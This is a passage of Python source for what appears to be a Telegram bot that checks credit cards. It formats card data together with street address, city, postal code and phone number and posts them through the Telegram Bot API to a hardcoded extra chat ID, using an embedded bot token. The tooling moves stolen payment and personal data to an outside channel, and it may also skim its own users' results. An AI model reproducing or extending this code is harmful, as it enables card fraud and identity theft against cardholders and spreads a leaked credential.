		tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acc}&text={mg}"
		tlg_params = {"parse_mode": "HTML"}
		tok = '7494183761:AAESeN3NVjZ46XRUUFAQ120a1kNAB8pJCPo'
		acb =  '-1002246001656'
		mag = f"""<b>
{cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
</b>"""
		tly = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acb}&text={mag}"
		tly_params = {"parse_mode": "HTML"}
		a = requests.post(tly, params=tly_params)
		i = requests.post(tlg, params=tlg_params)
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	else:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text= msgd)
@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
	id=call.from_user.id
	stopuser[f'{id}']['status'] = 'stop'

	
print("the bot has been launched")
while True:
	try:
		bot.polling(none_stop=True)
	except Exception as e:
		print(f"an error occurred: {e}")
		print(R+f'[{line}] '+card+' ➜ '+result+' ❌ ')
		print(Z+o)
	time.sleep(0)
